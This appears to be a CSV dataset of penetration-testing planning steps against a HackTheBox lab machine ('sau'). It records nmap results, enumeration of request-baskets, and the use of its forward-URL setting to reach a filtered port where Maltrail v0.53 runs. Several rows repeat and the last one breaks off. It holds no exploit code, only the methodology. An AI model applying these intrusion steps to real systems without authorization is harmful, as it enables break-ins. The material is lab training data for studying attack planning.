Machine,PTT,Previous strategy,Previous step,Previous step result,New strategy,Strategy explanation,New step,Step explanation,MCP_tasks
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed) {Findings: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555}
       1.3.2 Determine the services and versions on each open port - (completed) {Findings: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds}",,Do an nmap scan to find the open ports and the services.,"1. Host: sau.htb (10.129.229.26)
2. Host status: Up (1.0s latency)
3. Closed TCP ports: 997 (conn-refused)
4. Open Ports and Services: 
   - Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
   - Port 80: Filtered, Service: http
   - Port 55555: Open, Service: unknown
5. SSH Host Key: 
   - RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed
   - ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21
   - ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36
6. Port 55555 Responses: 
   - Invalid basket name error with pattern: ^[wd-_\.]{1,250}$
   - HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8
   - HTTP/1.0 302 Found, Location: /web
   - HTTP/1.0 200 OK, Allow: GET, OPTIONS
7. Unrecognized service: 1 service unrecognized despite returning data on port 55555
8. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
9. Scan Duration: 375.21 seconds",Explore the port 80 and 55555,"1. The intended task of the previous step was to identify open ports, services running on the open ports and their versions. This task was successfully achieved. The key findings from the previous step include the identification of three open ports: 22, 80, and 55555. The services running on these ports are SSH, HTTP, and an unknown service respectively. The SSH service on port 22 is running OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0). The HTTP service on port 80 is filtered. The service on port 55555 is unknown but it responded with several HTTP responses, including a 400 Bad Request, a 302 Found, and a 200 OK. There is also an unrecognized service returning data on port 55555.

2. The key findings lead to the next steps in the penetration testing process. The open ports provide potential entry points into the system. The services running on these ports provide information about the software that might be exploited. The versions of these services might have known vulnerabilities that can be exploited. The unknown service on port 55555 and the unrecognized service returning data on this port are particularly interesting because they might be running custom or less common software that could have security flaws. The HTTP responses from port 55555 suggest that this service is interacting with a web application, which could have vulnerabilities such as injection flaws, broken authentication, sensitive data exposure, etc.

3. Given the findings, the strategy to explore ports 80 and 55555 further is reasonable. Port 80 is commonly used for web services, so it might be hosting a web application with potential vulnerabilities. The unknown service on port 55555 is intriguing and warrants further investigation. The SSH service on port 22 is less interesting at this stage because it is running a known version of OpenSSH that is likely to be well secured. However, it could be explored later if other avenues of investigation do not yield results.","Enumerate further on the X service to find software versions, hidden directories and file.","1. The selected step is to further enumerate on the services running on ports 80 and 55555. The decision to focus on these two ports is based on the findings from the previous steps in the penetration testing process. 

2. Port 80 is commonly used for HTTP services, which often host web applications. Web applications can have a variety of vulnerabilities, such as misconfigurations, outdated software versions, and insecure endpoints. Therefore, enumerating on the service running on port 80 could potentially reveal valuable information that could be used to exploit these vulnerabilities.

3. Port 55555 is of particular interest because an unknown service is running on it. The service responded with several HTTP responses, suggesting that it is interacting with a web application. Furthermore, there is an unrecognized service returning data on this port. These findings indicate that the service on port 55555 might be running custom or less common software, which could have security flaws. Therefore, further enumeration on this service could reveal more about its nature and potentially uncover exploitable vulnerabilities.

4. The enumeration process involves identifying software versions, hidden directories, and files. Software versions can reveal known vulnerabilities if the software is outdated. Hidden directories and files can contain sensitive information or insecure endpoints. Therefore, this step could provide valuable information for exploiting the services running on ports 80 and 55555.

5. If the enumeration process reveals exploitable vulnerabilities, the next step would be to exploit these vulnerabilities to gain unauthorized access to the system. If no exploitable vulnerabilities are found, the penetration tester might need to revise the strategy and consider other potential entry points into the system.","{'Nmap': 'Enumerate services on ports 80 and 55555 to identify software versions.', 'Dirbuster': 'Brute force hidden directories and files on the web application.'}"
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed) {Findings: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555}
       1.3.2 Determine the services and versions on each open port - (completed) {Findings: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
       1.3.3 Enumerate further on the services - (completed) {Findings: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025}
   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26}",Explore the port 80 and 55555,"1. The selected step is to further enumerate on the services running on ports 80 and 55555. The decision to focus on these two ports is based on the findings from the previous steps in the penetration testing process. 

2. Port 80 is commonly used for HTTP services, which often host web applications. Web applications can have a variety of vulnerabilities, such as misconfigurations, outdated software versions, and insecure endpoints. Therefore, enumerating on the service running on port 80 could potentially reveal valuable information that could be used to exploit these vulnerabilities.

3. Port 55555 is of particular interest because an unknown service is running on it. The service responded with several HTTP responses, suggesting that it is interacting with a web application. Furthermore, there is an unrecognized service returning data on this port. These findings indicate that the service on port 55555 might be running custom or less common software, which could have security flaws. Therefore, further enumeration on this service could reveal more about its nature and potentially uncover exploitable vulnerabilities.

4. The enumeration process involves identifying software versions, hidden directories, and files. Software versions can reveal known vulnerabilities if the software is outdated. Hidden directories and files can contain sensitive information or insecure endpoints. Therefore, this step could provide valuable information for exploiting the services running on ports 80 and 55555.

5. If the enumeration process reveals exploitable vulnerabilities, the next step would be to exploit these vulnerabilities to gain unauthorized access to the system. If no exploitable vulnerabilities are found, the penetration tester might need to revise the strategy and consider other potential entry points into the system.","1. Port 80: No response
2. Port 55555: Directs to a web portal
3. Web Portal Content: 
   - Functionality: Creates a basket to collect and inspect HTTP requests
   - My Baskets: wygbo5a
   - Powered by request-baskets
   - Version: 1.2.1
4. Basket Function: Collects any request sent to it
5. Example: 
   - GET request sent to one of the baskets (dmt5wkr) using curl
   - Headers: Accept: */*, User-Agent: curl/8.5.0
   - Time: 2:01:55 pm 04/08/2025
6. IP Address: 10.129.229.26",Explore the request basket further to manipulate configurations,"1. The intended task of the previous step was to further enumerate on the services running on ports 80 and 55555. This task was successfully achieved. The key findings from this step include the fact that there was no response from port 80, suggesting that it might be input filtered or not serving any active services. On the other hand, port 55555 directed us to a web portal that creates a ""basket"" to collect and inspect HTTP requests. The basket function collects any request sent to it, and an example of a GET request sent to one of the baskets was provided.

2. The key findings lead to the next steps in the penetration testing process. The lack of response from port 80 suggests that it might not be a viable entry point into the system at this time. However, the web portal on port 55555 presents a potential opportunity for exploitation. The request basket functionality could potentially be manipulated to redirect requests to port 80 or to reveal sensitive information. The version of the request-baskets software (1.2.1) might also have known vulnerabilities that can be exploited.

3. Given these findings, the strategy to explore the request basket further and try to manipulate its configurations is a logical next step. This could involve trying to redirect requests to port 80, attempting to reveal sensitive information, or exploiting potential vulnerabilities in the request-baskets software. If this strategy is successful, it could provide a way to gain unauthorized access to the system. If it is not successful, the penetration tester might need to revise the strategy and consider other potential entry points into the system.","Further Enumerate the website;hidden directories, links and software","1. The selected step is to further enumerate the website running on port 55555, specifically focusing on hidden directories, links, and software. This decision is based on the findings from the previous steps in the penetration testing process.

2. The previous step revealed that port 55555 is hosting a web portal with a request basket functionality. This basket collects any request sent to it, which could potentially be manipulated to reveal sensitive information or to redirect requests to another port, such as the non-responsive port 80. 

3. The enumeration process involves identifying hidden directories, links, and software versions. These could provide additional information about the system and potentially reveal exploitable vulnerabilities. For instance, hidden directories and files might contain sensitive information or insecure endpoints. The software version might have known vulnerabilities if it is outdated. 

4. The strategy to manipulate the configuration of the request basket is based on the assumption that it could provide a way to gain unauthorized access to the system. By further enumerating the website, we might be able to find a way to manipulate the request basket or identify other potential vulnerabilities. 

5. If this step is successful, it could lead to the exploitation of the identified vulnerabilities to gain unauthorized access to the system. If it is not successful, the penetration tester might need to revise the strategy and consider other potential entry points into the system.","{'Dirbuster': 'Brute force hidden directories and files on the web portal.', 'Web page interaction': 'Interact with the web portal to identify links and software versions.'}"
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed) {Findings: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555}
       1.3.2 Determine the services and versions on each open port - (completed) {Findings: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
       1.3.3 Enumerate further on the services - (completed) {Findings: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025, Configuration Setup Box: Allows to set up the config, Configuration Settings: Forward URL: 127.0.0.1:80, Insecure TLS: Only affects forwarding to URLs like https://..., Proxy Response: Expand Forward Path, Basket Capacity: 200, Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering, Response Content: altrail Documentation, Wiki, Issues, Log In, Filters: Threats, Events, Severity, Sources, Trails, Powered by Maltrail (v0.53), Options: Hide threat, Report false positive}
   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26}",Explore the request basket further to manipulate configurations,"1. The selected step is to further enumerate the website running on port 55555, specifically focusing on hidden directories, links, and software. This decision is based on the findings from the previous steps in the penetration testing process.

2. The previous step revealed that port 55555 is hosting a web portal with a request basket functionality. This basket collects any request sent to it, which could potentially be manipulated to reveal sensitive information or to redirect requests to another port, such as the non-responsive port 80. 

3. The enumeration process involves identifying hidden directories, links, and software versions. These could provide additional information about the system and potentially reveal exploitable vulnerabilities. For instance, hidden directories and files might contain sensitive information or insecure endpoints. The software version might have known vulnerabilities if it is outdated. 

4. The strategy to manipulate the configuration of the request basket is based on the assumption that it could provide a way to gain unauthorized access to the system. By further enumerating the website, we might be able to find a way to manipulate the request basket or identify other potential vulnerabilities. 

5. If this step is successful, it could lead to the exploitation of the identified vulnerabilities to gain unauthorized access to the system. If it is not successful, the penetration tester might need to revise the strategy and consider other potential entry points into the system.","1. Configuration Setup Box: Allows to set up the config
2. Configuration Settings: 
   - Forward URL: 127.0.0.1:80
   - Insecure TLS: Only affects forwarding to URLs like https://...
   - Proxy Response: Expand Forward Path
   - Basket Capacity: 200
3. Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering
4. Response Content: 
   - altrail Documentation, Wiki, Issues, Log In
   - Filters: Threats, Events, Severity, Sources, Trails
   - Powered by Maltrail (v0.53)
   - Options: Hide threat, Report false positive",Do a vulnerability analysis on Maltrail (v0.53),"1. The intended task of the previous step was to manipulate the configuration of the request basket on port 55555 and further enumerate the website. This task was successfully achieved. The key findings from this step include the fact that the configuration settings of the request basket allowed for redirecting GET requests to port 80, bypassing the port filtering. This yielded a proxy response that revealed the presence of a service powered by Maltrail (v0.53) on port 80.

2. The key findings lead to the next steps in the penetration testing process. The revelation of the Maltrail service on port 80, which was previously unresponsive, is a significant discovery. Maltrail is a malicious traffic detection system, and the identified version (v0.53) could potentially have known vulnerabilities that can be exploited. 

3. Given these findings, the strategy to perform a vulnerability analysis on Maltrail (v0.53) is a logical next step. This could involve researching known vulnerabilities of this specific version of Maltrail, and if any are found, attempting to exploit them to gain unauthorized access to the system. If this strategy is successful, it could provide a way to breach the system. If it is not successful, the penetration tester might need to revise the strategy and consider other potential entry points into the system.",Do a google search for more information,"1. The selected step is to conduct a Google search for more information on Maltrail (v0.53). This decision is based on the findings from the previous steps in the penetration testing process.

2. The previous step revealed that the service running on port 80, which was initially unresponsive, is powered by Maltrail (v0.53). Maltrail is a malicious traffic detection system, and the identified version could potentially have known vulnerabilities. 

3. Conducting a Google search is a common and effective way to gather information about known vulnerabilities of specific software versions. There are numerous online databases and forums where vulnerabilities are reported and discussed, often with links to detailed explanations and sometimes even exploit code.

4. The strategy to perform a vulnerability analysis on Maltrail (v0.53) is based on the assumption that exploiting a known vulnerability could provide a way to gain unauthorized access to the system. By conducting a Google search, we can gather more information about potential vulnerabilities and how to exploit them.

5. If this step is successful, it could lead to the identification of one or more vulnerabilities that can be exploited to breach the system. If it is not successful, the penetration tester might need to revise the strategy and consider other potential entry points into the system.",{'Google search': 'Conduct a search for known vulnerabilities in Maltrail (v0.53)'}
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed) {Findings: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555}
       1.3.2 Determine the services and versions on each open port - (completed) {Findings: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds}",,Do an nmap scan to find the open ports and the services.,"1. Host: sau.htb (10.129.229.26)
2. Host status: Up (1.0s latency)
3. Closed TCP ports: 997 (conn-refused)
4. Open Ports and Services: 
   - Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
   - Port 80: Filtered, Service: http
   - Port 55555: Open, Service: unknown
5. SSH Host Key: 
   - RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed
   - ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21
   - ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36
6. Port 55555 Responses: 
   - Invalid basket name error with pattern: ^[wd-_\.]{1,250}$
   - HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8
   - HTTP/1.0 302 Found, Location: /web
   - HTTP/1.0 200 OK, Allow: GET, OPTIONS
7. Unrecognized service: 1 service unrecognized despite returning data on port 55555
8. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
9. Scan Duration: 375.21 seconds",Explore the port 80 and 55555,"1. The intended task of the previous step was to identify open ports, services running on the open ports and their versions. This task was successfully achieved. The key findings from the previous step include the identification of three open ports: 22, 80, and 55555. The services running on these ports are SSH, HTTP, and an unknown service respectively. The SSH service on port 22 is running OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0). The HTTP service on port 80 is filtered. The service on port 55555 is unknown but it responded with several HTTP responses, including a 400 Bad Request, a 302 Found, and a 200 OK. There is also an unrecognized service returning data on port 55555.

2. The key findings lead to the next steps in the penetration testing process. The open ports provide potential entry points into the system. The services running on these ports provide information about the software that might be exploited. The versions of these services might have known vulnerabilities that can be exploited. The unknown service on port 55555 and the unrecognized service returning data on this port are particularly interesting because they might be running custom or less common software that could have security flaws. The HTTP responses from port 55555 suggest that this service is interacting with a web application, which could have vulnerabilities such as injection flaws, broken authentication, sensitive data exposure, etc.

3. Given the findings, the strategy to explore ports 80 and 55555 further is reasonable. Port 80 is commonly used for web services, so it might be hosting a web application with potential vulnerabilities. The unknown service on port 55555 is intriguing and warrants further investigation. The SSH service on port 22 is less interesting at this stage because it is running a known version of OpenSSH that is likely to be well secured. However, it could be explored later if other avenues of investigation do not yield results.","Enumerate further on the X service to find software versions, hidden directories and file.","1. The selected step is to further enumerate on the services running on ports 80 and 55555. The decision to focus on these two ports is based on the findings from the previous steps in the penetration testing process. 

2. Port 80 is commonly used for HTTP services, which often host web applications. Web applications can have a variety of vulnerabilities, such as misconfigurations, outdated software versions, and insecure endpoints. Therefore, enumerating on the service running on port 80 could potentially reveal valuable information that could be used to exploit these vulnerabilities.

3. Port 55555 is of particular interest because an unknown service is running on it. The service responded with several HTTP responses, suggesting that it is interacting with a web application. Furthermore, there is an unrecognized service returning data on this port. These findings indicate that the service on port 55555 might be running custom or less common software, which could have security flaws. Therefore, further enumeration on this service could reveal more about its nature and potentially uncover exploitable vulnerabilities.

4. The enumeration process involves identifying software versions, hidden directories, and files. Software versions can reveal known vulnerabilities if the software is outdated. Hidden directories and files can contain sensitive information or insecure endpoints. Therefore, this step could provide valuable information for exploiting the services running on ports 80 and 55555.

5. If the enumeration process reveals exploitable vulnerabilities, the next step would be to exploit these vulnerabilities to gain unauthorized access to the system. If no exploitable vulnerabilities are found, the penetration tester might need to revise the strategy and consider other potential entry points into the system.","{'Nmap': 'Enumerate services on ports 80 and 55555 to identify software versions.', 'Dirbuster': 'Brute force hidden directories and files on the web application.'}"
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed) {Findings: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555}
       1.3.2 Determine the services and versions on each open port - (completed) {Findings: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
       1.3.3 Enumerate further on the services - (completed) {Findings: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025}
   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26}",Explore the port 80 and 55555,"1. The selected step is to further enumerate on the services running on ports 80 and 55555. The decision to focus on these two ports is based on the findings from the previous steps in the penetration testing process. 

2. Port 80 is commonly used for HTTP services, which often host web applications. Web applications can have a variety of vulnerabilities, such as misconfigurations, outdated software versions, and insecure endpoints. Therefore, enumerating on the service running on port 80 could potentially reveal valuable information that could be used to exploit these vulnerabilities.

3. Port 55555 is of particular interest because an unknown service is running on it. The service responded with several HTTP responses, suggesting that it is interacting with a web application. Furthermore, there is an unrecognized service returning data on this port. These findings indicate that the service on port 55555 might be running custom or less common software, which could have security flaws. Therefore, further enumeration on this service could reveal more about its nature and potentially uncover exploitable vulnerabilities.

4. The enumeration process involves identifying software versions, hidden directories, and files. Software versions can reveal known vulnerabilities if the software is outdated. Hidden directories and files can contain sensitive information or insecure endpoints. Therefore, this step could provide valuable information for exploiting the services running on ports 80 and 55555.

5. If the enumeration process reveals exploitable vulnerabilities, the next step would be to exploit these vulnerabilities to gain unauthorized access to the system. If no exploitable vulnerabilities are found, the penetration tester might need to revise the strategy and consider other potential entry points into the system.","1. Port 80: No response
2. Port 55555: Directs to a web portal
3. Web Portal Content: 
   - Functionality: Creates a basket to collect and inspect HTTP requests
   - My Baskets: wygbo5a
   - Powered by request-baskets
   - Version: 1.2.1
4. Basket Function: Collects any request sent to it
5. Example: 
   - GET request sent to one of the baskets (dmt5wkr) using curl
   - Headers: Accept: */*, User-Agent: curl/8.5.0
   - Time: 2:01:55 pm 04/08/2025
6. IP Address: 10.129.229.26",Explore the request basket further to manipulate configurations,"1. The intended task of the previous step was to further enumerate on the services running on ports 80 and 55555. This task was successfully achieved. The key findings from this step include the fact that there was no response from port 80, suggesting that it might be input filtered or not serving any active services. On the other hand, port 55555 directed us to a web portal that creates a ""basket"" to collect and inspect HTTP requests. The basket function collects any request sent to it, and an example of a GET request sent to one of the baskets was provided.

2. The key findings lead to the next steps in the penetration testing process. The lack of response from port 80 suggests that it might not be a viable entry point into the system at this time. However, the web portal on port 55555 presents a potential opportunity for exploitation. The request basket functionality could potentially be manipulated to redirect requests to port 80 or to reveal sensitive information. The version of the request-baskets software (1.2.1) might also have known vulnerabilities that can be exploited.

3. Given these findings, the strategy to explore the request basket further and try to manipulate its configurations is a logical next step. This could involve trying to redirect requests to port 80, attempting to reveal sensitive information, or exploiting potential vulnerabilities in the request-baskets software. If this strategy is successful, it could provide a way to gain unauthorized access to the system. If it is not successful, the penetration tester might need to revise the strategy and consider other potential entry points into the system.","Further Enumerate the website;hidden directories, links and software","1. The selected step is to further enumerate the website running on port 55555, specifically focusing on hidden directories, links, and software. This decision is based on the findings from the previous steps in the penetration testing process.

2. The previous step revealed that port 55555 is hosting a web portal with a request basket functionality. This basket collects any request sent to it, which could potentially be manipulated to reveal sensitive information or to redirect requests to another port, such as the non-responsive port 80. 

3. The enumeration process involves identifying hidden directories, links, and software versions. These could provide additional information about the system and potentially reveal exploitable vulnerabilities. For instance, hidden directories and files might contain sensitive information or insecure endpoints. The software version might have known vulnerabilities if it is outdated. 

4. The strategy to manipulate the configuration of the request basket is based on the assumption that it could provide a way to gain unauthorized access to the system. By further enumerating the website, we might be able to find a way to manipulate the request basket or identify other potential vulnerabilities. 

5. If this step is successful, it could lead to the exploitation of the identified vulnerabilities to gain unauthorized access to the system. If it is not successful, the penetration tester might need to revise the strategy and consider other potential entry points into the system.","{'Dirbuster': 'Brute force hidden directories and files on the web portal.', 'Web page interaction': 'Interact with the web portal to identify links and software versions.'}"
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed) {Findings: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555}
       1.3.2 Determine the services and versions on each open port - (completed) {Findings: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
       1.3.3 Enumerate further on the services - (completed) {Findings: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025, Configuration Setup Box: Allows to set up the config, Configuration Settings: Forward URL: 127.0.0.1:80, Insecure TLS: Only affects forwarding to URLs like https://..., Proxy Response: Expand Forward Path, Basket Capacity: 200, Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering, Response Content: altrail Documentation, Wiki, Issues, Log In, Filters: Threats, Events, Severity, Sources, Trails, Powered by Maltrail (v0.53), Options: Hide threat, Report false positive}
   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26}",Explore the request basket further to manipulate configurations,"1. The selected step is to further enumerate the website running on port 55555, specifically focusing on hidden directories, links, and software. This decision is based on the findings from the previous steps in the penetration testing process.

2. The previous step revealed that port 55555 is hosting a web portal with a request basket functionality. This basket collects any request sent to it, which could potentially be manipulated to reveal sensitive information or to redirect requests to another port, such as the non-responsive port 80. 

3. The enumeration process involves identifying hidden directories, links, and software versions. These could provide additional information about the system and potentially reveal exploitable vulnerabilities. For instance, hidden directories and files might contain sensitive information or insecure endpoints. The software version might have known vulnerabilities if it is outdated. 

4. The strategy to manipulate the configuration of the request basket is based on the assumption that it could provide a way to gain unauthorized access to the system. By further enumerating the website, we might be able to find a way to manipulate the request basket or identify other potential vulnerabilities. 

5. If this step is successful, it could lead to the exploitation of the identified vulnerabilities to gain unauthorized access to the system. If it is not successful, the penetration tester might need to revise the strategy and consider other potential entry points into the system.","1. Configuration Setup Box: Allows to set up the config
2. Configuration Settings: 
   - Forward URL: 127.0.0.1:80
   - Insecure TLS: Only affects forwarding to URLs like https://...
   - Proxy Response: Expand Forward Path
   - Basket Capacity: 200
3. Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering
4. Response Content: 
   - altrail Documentation, Wiki, Issues, Log In
   - Filters: Threats, Events, Severity, Sources, Trails
   - Powered by Maltrail (v0.53)
